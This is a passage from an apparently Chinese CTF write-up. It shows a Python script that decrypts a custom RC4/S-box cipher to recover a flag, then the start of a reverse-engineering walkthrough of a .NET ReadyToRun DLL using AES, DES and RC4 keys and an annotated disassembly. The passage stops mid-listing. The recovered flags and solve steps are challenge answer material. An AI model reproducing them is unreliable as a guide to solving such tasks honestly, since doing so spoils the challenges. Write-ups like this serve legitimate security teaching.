<span class="number">0xCC</span>, <span class="number">0xA6</span>, <span class="number">0x64</span>, <span class="number">0x4F</span>, <span class="number">0xB2</span>, <span class="number">0xB6</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0x05</span>, <span class="number">0x16</span>, <span class="number">0xED</span>, </span><br><span class="line">         <span class="number">0xD3</span>, <span class="number">0x17</span>, <span class="number">0xCA</span>, <span class="number">0x2B</span>, <span class="number">0x65</span>, <span class="number">0x86</span>, <span class="number">0xCD</span>, <span class="number">0xB2</span>, <span class="number">0xEA</span>, <span class="number">0xE3</span>, <span class="number">0x8E</span>, <span class="number">0xB4</span>, <span class="number">0xF9</span>, <span class="number">0xBF</span>, <span class="number">0x6A</span>, <span class="number">0xE2</span>, </span><br><span class="line">         <span class="number">0x07</span>, <span class="number">0xE6</span>, <span class="number">0x76</span>, <span class="number">0x7C</span>, <span class="number">0x85</span>, <span class="number">0xDE</span>, <span class="number">0x50</span>, <span class="number">0x88</span>, <span class="number">0xBB</span>, <span class="number">0x3F</span>, <span class="number">0xD0</span>, <span class="number">0x97</span>, <span class="number">0xAD</span>, <span class="number">0x3D</span>, <span class="number">0xAE</span>, <span class="number">0x4D</span>, </span><br><span class="line">         <span class="number">0xC7</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0xB9</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0xB0</span>, <span class="number">0x66</span>, <span class="number">0xB8</span>, <span class="number">0x61</span>, <span class="number">0x95</span>, <span class="number">0x23</span>, <span class="number">0x1F</span>, <span class="number">0xFB</span>, </span><br><span class="line">         <span class="number">0x4A</span>, <span class="number">0xBD</span>, <span class="number">0x9C</span>, <span class="number">0x09</span>, <span class="number">0x9D</span>, <span class="number">0xAB</span>, <span class="number">0x31</span>, <span class="number">0x0E</span>, <span class="number">0xBA</span>, <span class="number">0x0A</span>, <span class="number">0xB9</span>, <span class="number">0xF3</span>, <span class="number">0x7F</span>, <span class="number">0xF6</span>, <span class="number">0xB4</span>, <span class="number">0x9F</span>, </span><br><span class="line">         <span class="number">0x65</span>, <span class="number">0x31</span>, <span class="number">0x69</span>, <span class="number">0x8E</span>, <span class="number">0x02</span>, <span class="number">0xC0</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0x7A</span>, <span class="number">0xDD</span>, <span class="number">0x0E</span>, <span class="number">0x2F</span>, <span class="number">0x3F</span>, <span class="number">0xE6</span>, <span class="number">0xCF</span>, <span class="number">0x99</span>]</span><br><span class="line"><span class="comment">#用原有的sbox1加密sbox2</span></span><br><span class="line">sbox2 = PRGA(sbox1, sbox2)</span><br><span class="line"><span class="comment">#初始化sbox3</span></span><br><span class="line">sbox3 = [<span class="literal">None</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    sbox3[i] = i</span><br><span class="line"><span class="comment">#用第二个密钥生成sbox3</span></span><br><span class="line">sbox3 = KSA(<span class="string">b&quot;363296f1-9353&quot;</span>, sbox3)</span><br><span class="line"><span class="comment">#密钥初始化</span></span><br><span class="line">key = [<span class="number">0x11</span>, <span class="number">0x0D</span>, <span class="number">0x73</span>]</span><br><span class="line"><span class="comment">#密钥在另一个函数中被异或0x34</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] ^= <span class="number">0x34</span></span><br><span class="line"><span class="comment">#测试加密：</span></span><br><span class="line"><span class="comment"># test = [0x66,0x6c,0x61,0x67,0x7b,0x31,0x33,0x33,0x34,0x35,0x36,0x37,0x38,0x39,</span></span><br><span class="line"><span class="comment">#         0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x31,0x32,0x33,</span></span><br><span class="line"><span class="comment">#         0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x7d]</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     test[i] = sbox2[test[i]]</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     sbox3, test[i] = OneTextPRGA(sbox3, test[i], key[i % 3])</span></span><br><span class="line"><span class="comment"># test = encrypt_transform(test)</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     print(hex(test[i]),end=&quot;, &quot;)</span></span><br><span class="line"><span class="comment">#解密：</span></span><br><span class="line">encflag = [<span class="number">0x78</span>, <span class="number">0xD4</span>, <span class="number">0xD5</span>, <span class="number">0x92</span>, <span class="number">0x98</span>, <span class="number">0x62</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x29</span>, <span class="number">0xAE</span>, <span class="number">0x9B</span>, <span class="number">0x58</span>, </span><br><span class="line">           <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x0D</span>, <span class="number">0x7D</span>, <span class="number">0xA4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0x79</span>, <span class="number">0x30</span>, <span class="number">0xF3</span>, <span class="number">0x21</span>, <span class="number">0xD1</span>, <span class="number">0xCD</span>, </span><br><span class="line">           <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x8D</span>, <span class="number">0xAC</span>, <span class="number">0xBC</span>, <span class="number">0x4A</span>, <span class="number">0x81</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xF5</span>, <span class="number">0xC2</span>, <span class="number">0xC8</span>, <span class="number">0x3F</span>, <span class="number">0x0A</span>]</span><br><span class="line">encflag = decrypt_transform(encflag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encflag)):</span><br><span class="line">    sbox3, encflag[i] = OneTextPRGA(sbox3, encflag[i], key[i % <span class="number">3</span>])</span><br><span class="line"><span class="comment">#还原替换</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>(<span class="string">b&quot;&quot;</span>)</span><br><span class="line">decflag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encflag)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sbox2)):</span><br><span class="line">        <span class="keyword">if</span> sbox2[j] == encflag[i]:</span><br><span class="line">            flag.append(j)</span><br><span class="line">            decflag.append(j)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>flag{2af4101a-201a-4ab9-a664-903577cb9ff0}</strong></font>.</p>
<h2 id="简单的逆向："><a href="#简单的逆向：" class="headerlink" title="简单的逆向："></a>简单的逆向：</h2><p>查看dll的源代码，发现Main中有一个很明显的假逻辑：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (text == <span class="string">&quot;flag&#123;i_am_the_true_flag&#125;&quot;</span>)&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这当然一看就是错的，接着往下看，给出了一个可疑的密文<font color=lime><strong>[0x80, 0x78, 0xd6, 0xff, 0x8e, 0xeb, 0x3a, 0x62, 0x9a, 0xcc, 0xa, 0x6b, 0x75, 0x11, 0xc0, 0xc6, 0x3d, 0xa2, 0xda, 0x5f, 0x39, 0xb1, 0xaf, 0x3e, 0x6f, 0x6, 0x28, 0xb2, 0x95, 0xe7, 0xa3, 0x13, 0x24, 0x9, 0xf9, 0xc0, 0x5e, 0x3, 0xec, 0xc9, 0x7b, 0xcb, 0x96, 0x62, 0x3b, 0x8d, 0xea, 0x75, 0xe5, 0x6c, 0x87, 0x28, 0x69, 0x30, 0x59, 0x80, 0xb, 0xbd, 0x23, 0xae, 0xa7, 0xd, 0x37, 0xdc]</strong></font>，一个RC4密钥<font color=red><strong>[0x11, 0x45, 0x14]</strong></font>，再往下是三个比较，分别对应AES加密、RC4加密和DES加密，其中AES加密的key为<font color=violet><strong>A1B2C3D4E5F6G7H8</strong></font>，iv为<font color=violet><strong>H8G7F6E5D4C3B2A1</strong></font>，DES的比较是将加密结果的逆序与密文比较，key为<font color=lightblue><strong>Z1Y2X3W4</strong></font>，iv为<font color=lightblue><strong>W4X3Y2Z1</strong></font>，RC4的比较只检查了两个带入字节串的长度相等，首位均为25（0x19），第一个字节串末尾为129（0x81），第二个字节串末尾为0，算法上额外xor了一个100（0x64），再往后还有一个名为<code>&lt;&lt;Main&gt;$&gt;g__wtf|0_0</code>的函数和一个“你愿意相信我吗？”的提示，而这个函数并不能正确反编译，猜测有SMC，基于现有的三种加密和其独特的比较方式：</p>
<p>①	AES_CBC，key，iv，长度比较+全等比较<br><br>②	DES_CBC，key，iv，长度比较+逆序比较<br><br>③	RC4_xor_100，key，长度比较+首位均为25，第一个字节串末尾为129，第二个字节串末尾为0<br></p>
<p>由于RC4这里的比较最为奇怪（因为密文本身就不满足这个比较条件），猜测密文本身也被修改过，题目提示了ready to run这一格式，用R2Rdump解析where.dll得到程序真正的Main：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line">3ab0: <span class="number">41</span> <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">r15</span>	UWOP_PUSH_NONVOL <span class="built_in">R15</span>(<span class="number">15</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3ab2: <span class="number">41</span> <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">r14</span>	UWOP_PUSH_NONVOL <span class="built_in">R14</span>(<span class="number">14</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3ab4: <span class="number">41</span> <span class="number">54</span>                     <span class="keyword">push</span>    <span class="built_in">r12</span>	UWOP_PUSH_NONVOL <span class="built_in">R12</span>(<span class="number">12</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3ab6: <span class="number">57</span>                        <span class="keyword">push</span>    <span class="built_in">rdi</span>	UWOP_PUSH_NONVOL <span class="built_in">RDI</span>(<span class="number">7</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3ab7: <span class="number">56</span>                        <span class="keyword">push</span>    <span class="built_in">rsi</span>	UWOP_PUSH_NONVOL <span class="built_in">RSI</span>(<span class="number">6</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3ab8: <span class="number">55</span>                        <span class="keyword">push</span>    <span class="built_in">rbp</span>	UWOP_PUSH_NONVOL <span class="built_in">RBP</span>(<span class="number">5</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3ab9: <span class="number">53</span>                        <span class="keyword">push</span>    <span class="built_in">rbx</span>	UWOP_PUSH_NONVOL <span class="built_in">RBX</span>(<span class="number">3</span>)                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3aba: <span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>               <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">32</span>	UWOP_ALLOC_SMALL <span class="number">32</span>                                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">3abe: <span class="number">48</span> 8b <span class="number">0d</span> 7b 8a <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c540</span>] // <span class="string">&quot;Input your flag:&quot;</span> (STRING_HANDLE)			//提示输入文本</span><br><span class="line">3ac5: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3ac8: ff <span class="number">15</span> f2 <span class="number">86</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1c0</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>Write(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3ace: ff <span class="number">15</span> dc <span class="number">86</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b0</span>]   // string System<span class="number">.</span>Console<span class="number">.</span>ReadLine() (METHOD_ENTRY_REF_TOKEN)	//读取输入</span><br><span class="line">                                <span class="built_in">RAX</span> is live</span><br><span class="line">3ad4: <span class="number">48</span> 8b f0                  <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RSI</span> is live</span><br><span class="line">3ad7: ff <span class="number">15</span> 5b <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c238</span>]   // System<span class="number">.</span>Text<span class="number">.</span>Encoding System<span class="number">.</span>Text<span class="number">.</span>Encoding<span class="number">.</span>get_ASCII() (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">3<span class="keyword">add</span>: <span class="number">48</span> 8b c8                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3ae0: <span class="number">48</span> 8b d6                  <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rsi</span></span><br><span class="line">                                <span class="built_in">RDX</span> is live</span><br><span class="line">3ae3: 4c <span class="number">8d</span> <span class="number">1d</span> b6 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">r11</span>, [<span class="number">0x1c0a0</span>]        // <span class="built_in">byte</span>[] System<span class="number">.</span>Text<span class="number">.</span>Encoding<span class="number">.</span>GetBytes(string) (VIRTUAL_ENTRY)</span><br><span class="line">3aea: <span class="number">39</span> <span class="number">09</span>                     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>], <span class="built_in">ecx</span></span><br><span class="line">3aec: ff <span class="number">15</span> ae <span class="number">85</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c0a0</span>]   // <span class="built_in">byte</span>[] System<span class="number">.</span>Text<span class="number">.</span>Encoding<span class="number">.</span>GetBytes(string) (VIRTUAL_ENTRY)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">                                <span class="built_in">RDX</span> is dead</span><br><span class="line">3af2: <span class="number">48</span> 8b c8                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3af5: ff <span class="number">15</span> <span class="number">65</span> <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c260</span>]   // <span class="built_in">byte</span>[] where<span class="number">.</span>TYuNpWqDZfXoRJvB<span class="number">.</span>CZmLWpXqNKOVFRtJ(<span class="built_in">byte</span>[]) 	//DES加密	(METHOD_ENTRY_DEF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3afb: <span class="number">48</span> 8b f8                  <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line">3afe: 8b 5f <span class="number">08</span>                  <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">8</span>]</span><br><span class="line">3b01: <span class="number">48</span> <span class="number">63</span> cb                  <span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">ebx</span></span><br><span class="line">3b04: ff <span class="number">15</span> 5e <span class="number">86</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c168</span>]   // <span class="built_in">byte</span>[] (NEW_ARRAY)</span><br><span class="line">3b0a: <span class="number">48</span> 8b e8                  <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RBP</span> is live</span><br><span class="line">3b0d: <span class="number">41</span> be <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">mov</span>     <span class="built_in">r14d</span>, <span class="number">1</span>			//<span class="built_in">r14d</span>初始值为<span class="number">1</span></span><br><span class="line">3b13: b9 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>            <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">3</span></span><br><span class="line">3b18: ff <span class="number">15</span> 4a <span class="number">86</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c168</span>]   // <span class="built_in">byte</span>[] (NEW_ARRAY)</span><br><span class="line">3b1e: 4c 8b f8                  <span class="keyword">mov</span>     <span class="built_in">r15</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">R15</span> is live</span><br><span class="line">3b21: <span class="number">48</span> <span class="number">8d</span> <span class="number">05</span> <span class="number">00</span> fe ff ff      <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="number">0x3928</span>]				//指向密钥“r2r”</span><br><span class="line">                                <span class="built_in">RAX</span> is dead</span><br><span class="line">3b28: <span class="number">66</span> 8b <span class="number">10</span>                  <span class="keyword">mov</span>     <span class="built_in">dx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line">3b2b: <span class="number">66</span> <span class="number">41</span> <span class="number">89</span> <span class="number">57</span> <span class="number">10</span>            <span class="keyword">mov</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">r15</span> + <span class="number">16</span>], <span class="built_in">dx</span></span><br><span class="line">3b30: 8a <span class="number">50</span> <span class="number">02</span>                  <span class="keyword">mov</span>     <span class="built_in">dl</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">2</span>]</span><br><span class="line">3b33: <span class="number">41</span> <span class="number">88</span> <span class="number">57</span> <span class="number">12</span>               <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">r15</span> + <span class="number">18</span>], <span class="built_in">dl</span></span><br><span class="line">3b37: <span class="number">33</span> c9                     <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">3b39: <span class="number">85</span> <span class="built_in">db</span>                     <span class="keyword">test</span>    <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line">3b3b: 0f 8e <span class="number">92</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jle</span>     <span class="number">0x3bd3</span></span><br><span class="line">3b41: <span class="number">44</span> 8b <span class="number">65</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">r12d</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="number">8</span>]</span><br><span class="line">3b45: <span class="number">44</span> 3b e3                  <span class="keyword">cmp</span>     <span class="built_in">r12d</span>, <span class="built_in">ebx</span></span><br><span class="line">3b48: 7c 3f                     <span class="keyword">jl</span>      <span class="number">0x3b89</span>				//两条不同的路径，但是加密效果一样</span><br><span class="line">3b4a: <span class="number">48</span> <span class="number">63</span> c1                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">ecx</span></span><br><span class="line">3b4d: 0f b6 <span class="number">54</span> <span class="number">07</span> <span class="number">10</span>            <span class="keyword">movzx</span>   <span class="built_in">edx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="built_in">rax</span> + <span class="number">16</span>]</span><br><span class="line">3b52: <span class="number">41</span> <span class="number">33</span> d6                  <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">r14d</span>				//异或<span class="built_in">r14d</span></span><br><span class="line">3b55: <span class="number">44</span> 0f b6 c2               <span class="keyword">movzx</span>   <span class="built_in">r8d</span>, <span class="built_in">dl</span></span><br><span class="line">3b59: <span class="number">44</span> <span class="number">88</span> <span class="number">44</span> <span class="number">05</span> <span class="number">10</span>            <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="built_in">rax</span> + <span class="number">16</span>], <span class="built_in">r8b</span></span><br><span class="line">3b5e: ba <span class="number">09</span> <span class="number">04</span> <span class="number">02</span> <span class="number">81</span>            <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">2164392969</span>			//定值n</span><br><span class="line">3b63: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span>				//定值n</span><br><span class="line">3b65: <span class="number">41</span> f7 ee                  <span 